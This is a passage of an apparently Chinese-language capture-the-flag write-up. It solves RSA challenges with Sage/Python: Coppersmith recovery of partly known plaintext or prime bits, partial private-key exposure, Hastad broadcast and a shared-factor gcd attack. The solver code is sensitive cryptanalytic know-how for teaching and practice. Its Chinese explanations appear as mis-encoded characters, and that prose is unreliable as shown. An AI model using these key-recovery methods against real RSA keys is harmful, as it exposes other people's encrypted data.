class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="‚úÖChallenge-1"><a href="#‚úÖChallenge-1" class="headerlink" title="‚úÖChallenge 1"></a>‚úÖChallenge 1</h2><p>ÂØÜÊñáÈ´ò‰ΩçÂ∑≤Áü•ÔºåÊú™Áü•‰ΩéÊØîÁâπÊîªÂáª„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">1</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x5ab3c00a116dc6834ed79ad55036f3a81cf7d4cb41098118ca9efe1ccff298b951259a668da68c607e0ed85db54ac5243aaa380f0259e67f05a13de2b5f1e081c47e03d3cd785ccc182b316d87ac2be82a34dee2af8814dc70b55d33c1b5a7c300f07ba8a1086aaac63da37b234842661e971f533d65dacce3b477eb1232efb5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x41522844c262cd5e8c5d3064d1719131ba1803f6e35b3ad4c5838f758dcdc7201e296b3966bad4839b280017af8c788a13702a99aa0faddc4588c0091e3a728825e6b022dc1c3c9ec06a00cb54454e280daacd81ef822ee362d09d0ecb798d15e20918173aefe733b40b533205996de6a6ab3650827662065c03985e2dc6266aL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">=</span>0x765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503000000000000000000L<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python">e <span class="token operator">=</span> <span class="token number">0x3</span>b <span class="token operator">=</span> 0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000Ln <span class="token operator">=</span> 0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953Lc<span class="token operator">=</span>0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L<span class="token comment" spellcheck="true">#72bitsÊú™Áü•</span>kbits<span class="token operator">=</span><span class="token number">72</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token operator">-</span>cx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"x: %s"</span> <span class="token operator">%</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>x0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503750332f65eeb1e19a8</span></code></pre><h2 id="‚úÖChallenge-2"><a href="#‚úÖChallenge-2" class="headerlink" title="‚úÖChallenge 2"></a>‚úÖChallenge 2</h2><p>Â∑≤Áü•ÈÉ®ÂàÜÂõ†Êï∞È´òBitÔºåÊú™Áü•‰ΩéÊØîÁâπÊîªÂáª„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">2</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">65537</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x1922e7151c779d6bb554cba6a05858415e74739c36df0bcf169e49ef0e566a4353c51a306036970005f2321d1d104f91a673f40944e830619ed683d8f84eaf26e7a93c4abe1dbd7ca3babf3f4959def0e3d87f7818d54633a790fc74e9fed3c5b5456c21e3f425240f6217b0b14516cb59aa0ce74b83ca17d8cc4a0fbc829fb8L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">>></span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">=</span>0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#from sage.all import *</span><span class="token comment" spellcheck="true">#import binascii</span>n <span class="token operator">=</span> <span class="token number">0x68f56087cddf01e39e938d40df9a28bc9e5579d19d2763e7361ee464ae79e503d99a1c07eeec8c95cd928eb1ce41e0ba01bed85c45b2c0bc3c8ec04327f702d28f2983e9a8672c11cbb4a53279f22666ad5e6329d3ca32607f2d1b14f79315df440be17e254a59f614fb0bee9d49f3706c8dd67427cf7cc542324e15cbe27657</span>p4 <span class="token operator">=</span><span class="token number">0xedbe4e8eb2ba136c89848560f57b081e6e49a2ae7457ff5093b6b7182f484453fe8b1b51bb207618af5d5d06dc16c099</span>cipher <span class="token operator">=</span> 0x109824d42a3b891f9a6f3c21efa09cf01f59ad8d8b85953a515e4fd9799e72cce08328a200b17fb901508b0395964936e35fb698be4ab3fc275255bb2aaa49a6546df3f8963b543e2759c6ab517f9c1b4a0d9e3eba1a09ce35fec8025d286e56d7bbde2e2fa7b05402857b2425ff9a27034c9c04ccf703ba562ccf0726be2fe5Le2 <span class="token operator">=</span> <span class="token number">65537</span>pbits <span class="token operator">=</span> <span class="token number">512</span>kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> p4 <span class="token operator">&lt;&lt;</span> kbitsPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> p4roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token keyword">if</span> roots<span class="token punctuation">:</span>    p <span class="token operator">=</span> p4<span class="token operator">+</span>int<span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"p: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span>    q <span class="token operator">=</span> n<span class="token operator">/</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"q: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>    phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    flag <span class="token operator">=</span> pow<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 191445a91032bc5eb2f1ffc6db4db109b3c46e5b1d3cf92279d63712c7ae16725db646496b02c6a04c648e46bdc8430d82f39a240323fca0cc1ab38b16e5c107</span></code></pre><h2 id="‚úÖChallenge-3"><a href="#‚úÖChallenge-3" class="headerlink" title="‚úÖChallenge 3"></a>‚úÖChallenge 3</h2><p>Â∑≤Áü•ÈÉ®ÂàÜÁßÅÈí•Ôºå‰ΩÜÁßÅÈí•È´òÊØîÁâπÊú™Áü•ÔºåPartial Key Exposure Attack(ÈÉ®ÂàÜÁßÅÈí•Êö¥Èú≤ÊîªÂáª)„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x3d7e16fd8b0b1afdb4e12594c3d8590f1175800ef07bb275d7a8ad983d0d5d5fd5c6f81efa40f5d10c48bb200f805e679d633ee584748e5feef003e0921dea736ba91eef72f3d591d3a54cd59fd36f61140fdd3fb2e2c028b684e50cbeae4a1f386f6ab35359d46a29996c0f7d9a4a189f1096150496746f064c3cc41cf111b0L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span>0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>d <span class="token operator">=</span> 0x36a7780f1c08f66d7563a8fdbae2401c4e5eb8d97452b056fcadde216b2d6fd27abbbf38a37b7e742d4ab7cf04cc6f03e9fd64dbaa060c85af51a55ea733fd2017c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">partial_p</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x <span class="token operator">+</span> p0    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span>nbits<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span>kbits<span class="token punctuation">)</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^(nbits//2-kbits) with factor >= n^0.3</span>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>        x0 <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x0 <span class="token operator">+</span> p0<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">find_p</span><span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    X <span class="token operator">=</span> var<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        results <span class="token operator">=</span> solve_mod<span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token operator">*</span>d0<span class="token operator">*</span>X <span class="token operator">-</span> k<span class="token operator">*</span>X<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>X<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token operator">*</span>n <span class="token operator">==</span> X<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>            p0 <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> partial_p<span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token keyword">if</span> p<span class="token punctuation">:</span>                <span class="token keyword">return</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># n = 0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL</span>    e <span class="token operator">=</span> <span class="token number">3</span>    <span class="token comment" spellcheck="true"># d = 0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</span>    n <span class="token operator">=</span> <span class="token number">57569201048993475052349187244752169754165154575782760003851777813767048953051839288528137121670999884309849815765999616346303792471518639080697166767644957046582385785721102370288806038187956032505761532789716009522131450217010629338000241936036185205038814391205848232364006349213836317806903032515194407739</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>nbits<span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"kbits : "</span><span class="token punctuation">,</span> kbits     d0 <span class="token operator">=</span> <span class="token number">1244848677959253796774387650148978357579294769878147704641867595620534030329181934099194560059806799908134954814673426128260540575360296026444649631806619</span>    <span class="token keyword">print</span> <span class="token string">"lower %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span>    p <span class="token operator">=</span> find_p<span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"found p: %d"</span> <span class="token operator">%</span> p    q <span class="token operator">=</span> n<span class="token operator">//</span>p    <span class="token comment" spellcheck="true"># print d</span>    <span class="token keyword">print</span> inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 856119b6bdb17543c2089fefb23173e6cf6aff2d0c755760ac97fb9b3ca869a0875b5052f5a4dcef4c64c76ae97de9897398a79b291a851f2ebffef6dde90fdf</span></code></pre><h2 id="‚úÖChallenge-4"><a href="#‚úÖChallenge-4" class="headerlink" title="‚úÖChallenge 4"></a>‚úÖChallenge 4</h2><p>ÁªôÂá∫‰∏âÁªÑ(n,c)ÔºåÈááÁî®‰ΩéÊåáÊï∞ÂπøÊí≠ÊîªÂáª„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">4</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n1<span class="token operator">=</span>0x4b25bd834da788533ebef06f552bc8230024d1a571226770bd93bad3b202af4de7f680252a61cc423b3143db075196d6c282e71e84a3f3fe582c69c822389ddf76a86f9169334868119a884b8185c4ee559a3540141c785f2a9e1d59e3c828b26fc785ae4b578da073a39000fbaca6f30807a6110079dc64693dd1089835ea0bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c1<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token operator">=</span>0x5e6a4b86018060a6c38952cfd450695ca90444c51d4e0de4690dbadd5000f7bb62e752bbd70c27f342792cc669f0d650b0c8e31b233963c32ebc2297d5aae650a8be7ba5a49319cc010ea8333de09fb4ae9e25af4cce79afcaad80263fbb02329dadb49bfb5f87791c9d29e52103f0153a200f7a11b00086c3c7ae6bbc30269L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n2<span class="token operator">=</span>0x2388ddafc70ba72e181857376f3b23bf6b95c5f721a05e5e499caed0ee81a40031223718156752eef2c7535d8d8d0224126975492f8f002ca98d923ba3f05bff14eac24fb35dd50683cadc3ae0fa55ac368ebe5eb4ecfeb48ada4d785d7c64524783ef50a7c599a27b6a2afa9e1c1a41c6aba40dfd316eef4dc6718eba2af1c5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c2<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token operator">=</span>0x71c907c67faf78314ff0332a7fe1d23fd6c9d788425affd54b851c805327fe363c340b047b555f356b1d8b6a930cb22a2e2eb3eb492ab4b307bc782c34fe1dfd032a2d838a80fbf8f6990baa4c712bc9f3bcae964806d418301cd25bc35c0d07a3fc24b25ecc527d3bfafaa5c6ffcf171446238925a76039a2aadc557efb871L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n3<span class="token operator">=</span>0x33e9cbd05b84dc1e5d314656c937c2225351bd0573a5d2d8db357db8afb65be91b0362f8c1b9bbaab51c23decfff77cf8160e260c3374c2fd5b69d1a64cdddb5bd6e37e049e4a657d4a239177b9ec23a873ae272861567b8ea000880d0ba8e7f0449de97f955a78e78e7c8a3becbf3adb6825326786d98ecc30d34be67b5be69L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c3<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n3<span class="token punctuation">)</span><span class="token operator">=</span>0x37bf32f9bfd3afc668b2fb4f48ab3e888bbc204eda2dd05af8dc08974698aa7808cb8623ee16cb17ccc9e27de90d283569390f1ea155a645e46a47f4a1c147d139b631219a94ea3fcac314515a112c7e673ddf594482eec00c0ec8c46dbf4bc4532c19a5dcdbc0a1c8882937b5546653e73c047473df8aa350d876c7a62f60fL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">broadcast</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2 <span class="token punctuation">,</span>n3<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token punctuation">[</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> n3<span class="token punctuation">]</span>    C <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">]</span>    N <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        N <span class="token operator">*=</span> i    Ni <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        Ni<span class="token punctuation">.</span>append<span class="token punctuation">(</span>N <span class="token operator">/</span> i<span class="token punctuation">)</span>    T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>append<span class="token punctuation">(</span>long<span class="token punctuation">(</span>invert<span class="token punctuation">(</span>Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    X <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        X <span class="token operator">+=</span> C<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    m3 <span class="token operator">=</span> X <span class="token operator">%</span> N    m <span class="token operator">=</span> iroot<span class="token punctuation">(</span>m3<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>m <span class="token operator">=</span> hex<span class="token punctuation">(</span>broadcast<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><p>Ëã•ÊòØÁªôÂá∫‰∏§ÁªÑnÁöÑËØùÔºåÁõ¥Êé•ÂèØ‰ª•ÈááÁî®Ê±Ç‰∏§‰∏™nÁöÑÂÖ¨Á∫¶Êï∞ÁöÑÊñπÊ≥ïËøõË°åÊîªÂáª„ÄÇ</p><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># from libnum import gcd</span><span class="token comment" spellcheck="true"># n1=0xb4e9991d2fac12b098b01118d960eb5470261368e7b1ff2da2c66b4302835aa845dd50a4f749fea749c6d439156df6faf8d14ce2a57da3bac542f1843bfc80dfd632e7a2ef96496a660d8c5994aea9e1b665097503558bc2756ab06d362abe3777d8c1f388c8cd1d193955b70053382d330125bdc2cdc836453f1a26cec1021cbb787977336b2300f38c6ba881a93d2a2735f8f0d32ea2d0e9527eb15294dd0867c8030d1f646bd121c01706c247cd1bf4aa209d383ffb748b73ec1688dc71812675834b4b12d27a63b5b8fcc47394d16897ff96af49f39d8d5b247553fbf8fac7be08aab43d9ce5659cd5cfaf7d73edbcfe854d997ae4b28d879adf86641707</span><span class="token comment" spellcheck="true"># #  e1=0x10001</span><span class="token comment" spellcheck="true"># #  c1=0x3a10c58ed3e8f9eade48dad7d36518dabeeca3d169c848f3b4b2bb027220e13d8b071c55046b14213e966ad9c381e5cad9773d455aa0d36ddff9b9f24873d0979f1caff95d9569e4f312514c7e01979b39c466aa2d27ad521ae3c1ea2025ca2290185b3d79da4f6e4c7e77a70f206bd5c41eec65fd64f86c317b8207ca511b8297b597cb9c24afa652c1f1c7f2d8ca61cf4a63b17df165e4c02dc19578305f276cb81fdfadf0ffc8b86e13297f2692edf7e6324878bb8ca960a050af6b0ada8ba4accd72c7d2c74a41e98d801093e4cc5b1572b8e6be9f270c30759543986180bb4fc6863e14638ea74863dbdd1624cfdedaedb99dfd48901e7d4b486a7b13ea</span><span class="token comment" spellcheck="true"># 